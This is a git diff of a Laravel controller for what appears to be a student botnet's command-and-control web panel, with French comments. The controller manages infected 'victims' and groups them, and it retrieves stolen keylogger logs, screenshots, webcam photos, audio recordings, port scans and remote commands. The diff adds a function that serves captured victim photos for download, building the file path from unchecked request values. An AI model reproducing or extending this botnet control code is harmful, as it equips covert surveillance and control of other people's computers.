@@ -18,14 +18,14 @@ class VictimsController extends Controller
     {
         $username = auth()->user()->firtsname;
         $name = auth()->user()->lastname;
-    
+
         $unsigned_victims = Victims::doesntHave('victimGroups')->get();
 
         $all_victims = Victims::with('victimGroups')->get();
-    
+
         // Récupérer tous les groupes
         $groups = Network::all();
-    
+
         return view('victims', ['username' => $username, 'name' => $name, 'unsigned_victims' => $unsigned_victims, 'all_victims' => $all_victims, 'groups' => $groups]);
     }
 
@@ -52,38 +52,38 @@ class VictimsController extends Controller
     {
         $username = auth()->user()->firstname;
         $name = auth()->user()->lastname;
-    
+
         // Récupérer les informations de la victime
         $victim = Victims::find($id);
-    
+
         // Récupérer le groupe de la victime
         $victimGroup = VictimGroup::where('victim_id', $victim->id)->first();
         $group = $victimGroup ? Network::find($victimGroup->group_id) : null;
-    
+
         // Récupérer les enregistrements de la victime
         $records = VictimAttacks::where('victim_id', $victim->id)
             ->where('victim_attacks.type', 'record')
             ->where('victim_attacks.state', 'done')
             ->get();
-    
+
         // Récupérer les photos de la victime
         $pictures = VictimAttacks::where('victim_id', $victim->id)
             ->where('victim_attacks.type', 'picture')
             ->where('victim_attacks.state', 'done')
             ->get();
-    
+
         // Récupérer les captures d'écran de la victime
         $screenshots = VictimAttacks::where('victim_id', $victim->id)
             ->where('victim_attacks.type', 'screenshot')
             ->where('victim_attacks.state', 'done')
             ->get();
-    
+
         // Récupérer les scans de la victime
         $scans = VictimAttacks::where('victim_id', $victim->id)
             ->where('victim_attacks.type', 'scan')
             ->where('victim_attacks.state', 'done')
             ->get();
-    
+
         // Récupérer les keyloggers de la victime
         $keyloggers = VictimAttacks::where('victim_id', $victim->id)
             ->where('victim_attacks.type', 'keylogger')
@@ -94,14 +94,14 @@ class VictimsController extends Controller
         $autoreps = VictimAttacks::where('victim_id', $victim->id)
             ->where('victim_attacks.type', 'autorep')
             ->get();
-    
+
         // Récupérer les commandes de la victime
         $commands = VictimAttacks::where('victim_id', $victim->id)
             ->where('victim_attacks.type', 'command')
             ->get();
 
         return view('victims.show', [
-            'username' => $username, 
+            'username' => $username,
             'name' => $name,
             'victim' => $victim,
             'group' => $group,
@@ -114,7 +114,7 @@ class VictimsController extends Controller
             'commands' => $commands
         ]);
     }
-    
+
 
     /**
      * Show the form for editing the specified resource.
@@ -131,16 +131,16 @@ class VictimsController extends Controller
     {
         // Récupérer l'id de la victime
         $victim = Victims::find($id);
-    
+
         // Récupérer l'id du groupe
         $groupId = $request->input('group'); // Assurez-vous que cela correspond au 'name' dans le <select>
-    
+
         // Créer une nouvelle association dans victim_groups
         $victimGroup = new VictimGroup();
         $victimGroup->victim_id = $victim->id;
         $victimGroup->group_id = $groupId;
         $victimGroup->save();
-    
+
         return redirect()->route('victims.index')->with('success', 'Victime ajoutée au groupe avec succès.');
     }
 
@@ -173,7 +173,7 @@ class VictimsController extends Controller
         if ($port2 < $port1 && $port2 != ""){
             return redirect("/victims/$victim_id")->with('output', "Port de fin doit être supérieur au port de début.");
         }
-        
+
         if($port2 == ""){
             $scan = (new BotnetController)->scanport($victim_uid, $ip, $port1);
         }else{
@@ -223,6 +223,18 @@ class VictimsController extends Controller
 
         return redirect("/victims/$victim_id")->with('output', "Photo lancée sur la victime.");
     }
+
+    public function picture_dl(Request $request)
+    {
+        $photo_id = $request->picture_id;
+        $uid = $request->victim_uid;
+
+
+        $storagePath = '/home/debian/PA-BOTNET-PYSRV/result/picture/'.$uid.'/'.$photo_id.'.png';
+
+        return response()->download($storagePath);
+    }
+
 
     public function record(Request $request)
     {
